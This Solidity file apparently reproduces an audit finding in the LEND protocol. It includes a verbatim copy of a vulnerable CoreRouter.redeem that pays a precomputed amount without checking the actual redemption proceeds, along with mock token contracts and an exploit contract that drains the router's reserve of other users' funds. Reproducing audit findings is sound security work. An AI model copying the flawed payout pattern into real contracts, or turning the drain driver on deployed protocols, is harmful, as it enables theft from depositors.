// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of LEND (Sherlock 2025-05) finding
// 58376 (H-7): "CoreRouter Prone to Fund Depletion or Trapping Due to
// Miscalculated Redemption Payouts".
//
// Real audited source (the vulnerable `redeem` function is reproduced VERBATIM,
// the vulnerable line is marked @>):
//   repo   github.com/sherlock-audit/2025-05-lend-audit-contest
//   file   Lend-V2/src/LayerZero/CoreRouter.sol
//   fn     redeem  (L100-138)
//   report github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/464
//
// Root cause: `redeem` pre-computes `expectedUnderlying` from the LToken's
// `exchangeRateStored()` BEFORE the redeem, then pays the user that fixed
// amount — it NEVER checks how much underlying `LToken.redeem()` actually
// transferred to CoreRouter. When the LToken returns LESS than
// `expectedUnderlying` (redemption fee, or a rate not reflected in the stored
// value), CoreRouter pays out more than it received and its underlying reserve
// (other users' funds) is drained on every redemption.
//
// Faithful minimal doubles: an ERC20 underlying, an LToken whose `redeem`
// applies a redemption fee not reflected in `exchangeRateStored()`, and a
// LendStorage bookkeeping double. The verbatim `redeem` line does the harm.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface LTokenInterface {
    function exchangeRateStored() external view returns (uint256);
}

interface LErc20Interface {
    function redeem(uint256 redeemTokens) external returns (uint256);
}

/// @dev Faithful minimal ERC20 double for the market's underlying token.
contract MockToken is IERC20 {
    string public name = "Lend Underlying";
    string public symbol = "USDx";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Faithful LToken double. `exchangeRateStored()` reports a fixed stored
///      rate. `redeem(amount)` burns the caller's book value, computes the gross
///      underlying at that rate, but applies a redemption fee (kept by the
///      LToken) — so the underlying actually transferred to CoreRouter is
///      LESS than `expectedUnderlying`. This is the discrepancy the finding
///      describes; CoreRouter never notices it.
contract LToken is LTokenInterface, LErc20Interface {
    MockToken public underlying;
    uint256 public storedRate; // exchangeRateStored (scaled 1e18)
    uint256 public feeBps; // redemption fee not reflected in storedRate

    constructor(MockToken u, uint256 storedRate_, uint256 feeBps_) {
        underlying = u;
        storedRate = storedRate_;
        feeBps = feeBps_;
    }

    function exchangeRateStored() external view returns (uint256) {
        return storedRate;
    }

    function redeem(uint256 redeemTokens) external returns (uint256) {
        // Gross underlying owed at the stored rate.
        uint256 gross = (redeemTokens * storedRate) / 1e18;
        // Redemption fee retained by the LToken — NOT reflected in storedRate.
        uint256 fee = (gross * feeBps) / 10000;
        uint256 net = gross - fee;
        // Transfer the NET underlying to the caller (CoreRouter).
        underlying.transfer(msg.sender, net);
        return 0;
    }
}

/// @dev Faithful minimal LendStorage bookkeeping double for the fields `redeem`
///      touches. `getHypotheticalAccountLiquidityCollateral` returns a healthy
///      position so the liquidity check passes.
contract LendStorage {
    mapping(address => mapping(address => uint256)) public totalInvestment; // user => lToken => book balance
    mapping(address => address) public underlyingOf; // lToken => underlying

    function setUnderlying(address lToken, address token) external {
        underlyingOf[lToken] = token;
    }

    function setInvestment(address user, address lToken, uint256 amount) external {
        totalInvestment[user][lToken] = amount;
    }

    function lTokenToUnderlying(address lToken) external view returns (address) {
        return underlyingOf[lToken];
    }

    function getHypotheticalAccountLiquidityCollateral(address, LToken, uint256, uint256)
        external
        pure
        returns (uint256, uint256)
    {
        // healthy: collateral >= borrowed
        return (0, type(uint256).max);
    }

    function distributeSupplierLend(address, address) external {}

    function updateTotalInvestment(address user, address lToken, uint256 amount) external {
        totalInvestment[user][lToken] = amount;
    }

    function removeUserSuppliedAsset(address, address) external {}
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `CoreRouter.redeem` reproduced VERBATIM (L100-138).
// ─────────────────────────────────────────────────────────────────────────────
contract CoreRouter {
    LendStorage public immutable lendStorage;

    event RedeemSuccess(address indexed redeemer, address indexed lToken, uint256 redeemAmount, uint256 redeemTokens);

    constructor(LendStorage _lendStorage) {
        lendStorage = _lendStorage;
    }

    function redeem(uint256 _amount, address payable _lToken) external returns (uint256) {
        // Redeem lTokens
        address _token = lendStorage.lTokenToUnderlying(_lToken);

        require(_amount > 0, "Zero redeem amount");

        // Check if user has enough balance before any calculations
        require(lendStorage.totalInvestment(msg.sender, _lToken) >= _amount, "Insufficient balance");

        // Check liquidity
        (uint256 borrowed, uint256 collateral) =
            lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, LToken(_lToken), _amount, 0);
        require(collateral >= borrowed, "Insufficient liquidity");

        // Get exchange rate before redeem
        uint256 exchangeRateBefore = LTokenInterface(_lToken).exchangeRateStored();

        // Calculate expected underlying tokens
        uint256 expectedUnderlying = (_amount * exchangeRateBefore) / 1e18;

        // Perform redeem
        require(LErc20Interface(_lToken).redeem(_amount) == 0, "Redeem failed");

        // Transfer underlying tokens to the user
        IERC20(_token).transfer(msg.sender, expectedUnderlying); // @> VULN: pays precomputed expectedUnderlying, never checks the actual amount received from LToken.redeem() — CoreRouter overpays and drains its reserve

        // Update total investment
        lendStorage.distributeSupplierLend(_lToken, msg.sender);
        uint256 newInvestment = lendStorage.totalInvestment(msg.sender, _lToken) - _amount;
        lendStorage.updateTotalInvestment(msg.sender, _lToken, newInvestment);

        if (newInvestment == 0) {
            lendStorage.removeUserSuppliedAsset(msg.sender, _lToken);
        }

        emit RedeemSuccess(msg.sender, _lToken, expectedUnderlying, _amount);

        return 0;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: redeem lTokens; CoreRouter receives NET (post-fee) underlying
// from the LToken but pays the user the full pre-fee expectedUnderlying, so its
// reserve of other users' funds is drained by exactly the shortfall.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MockToken public token;
    LToken public lToken;
    LendStorage public lendStorage;
    CoreRouter public vuln;

    uint256 public expectedPaid; // what CoreRouter paid the user
    uint256 public actualReceived; // what CoreRouter got from LToken.redeem
    uint256 public reserveDrained; // funds taken from CoreRouter's reserve

    uint256 internal constant STORED_RATE = 2e18; // 1 lToken = 2 underlying (stored)
    uint256 internal constant FEE_BPS = 1000; // 10% redemption fee, not in storedRate
    uint256 internal constant REDEEM_AMT = 100e18; // lTokens redeemed
    uint256 internal constant CR_RESERVE = 1000e18; // other users' funds held by CoreRouter

    constructor() {
        token = new MockToken(); // child nonce 1  (drained token)
        lToken = new LToken(token, STORED_RATE, FEE_BPS); // child nonce 2
        lendStorage = new LendStorage(); // child nonce 3
        vuln = new CoreRouter(lendStorage); // child nonce 4  (VULN)

        // wiring
        lendStorage.setUnderlying(address(lToken), address(token));
        lendStorage.setInvestment(address(this), address(lToken), REDEEM_AMT);

        // LToken holds enough underlying to pay the gross redeem (200e18).
        token.mint(address(lToken), (REDEEM_AMT * STORED_RATE) / 1e18);
        // CoreRouter holds a reserve of OTHER users' underlying.
        token.mint(address(vuln), CR_RESERVE);
    }

    function run() external {
        uint256 crBefore = token.balanceOf(address(vuln));
        uint256 userBefore = token.balanceOf(address(this));

        vuln.redeem(REDEEM_AMT, payable(address(lToken)));

        expectedPaid = token.balanceOf(address(this)) - userBefore;
        // net received by CoreRouter from LToken = gross - fee
        uint256 gross = (REDEEM_AMT * STORED_RATE) / 1e18;
        actualReceived = gross - (gross * FEE_BPS) / 10000;
        // CoreRouter received `actualReceived` and paid `expectedPaid`; the net
        // drop of its pre-existing reserve is exactly the shortfall it eats.
        reserveDrained = crBefore - token.balanceOf(address(vuln));

        // harm: CoreRouter paid the user MORE than it received, draining its
        // reserve of other depositors' funds.
        require(expectedPaid == gross, "user not overpaid at stored rate");
        require(expectedPaid > actualReceived, "no overpayment");
        require(reserveDrained == gross - actualReceived, "reserve not drained by shortfall");
        require(reserveDrained > 0, "no drain");
    }
}
